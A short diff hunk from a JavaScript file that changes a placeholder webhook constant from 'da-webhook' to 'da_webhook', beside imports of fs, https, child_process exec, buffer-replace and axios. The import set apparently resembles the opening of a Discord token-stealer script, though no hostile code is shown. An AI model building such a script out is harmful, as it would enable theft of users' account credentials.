@@ -5,7 +5,7 @@ const fs = require('fs');
 const https = require('https');
 const { exec } = require('child_process');
 const buf_replace = require('buffer-replace');
-const webhook = "da-webhook"
+const webhook = "da_webhook"
 const path = require("path")
 const axios = require("axios").default
 
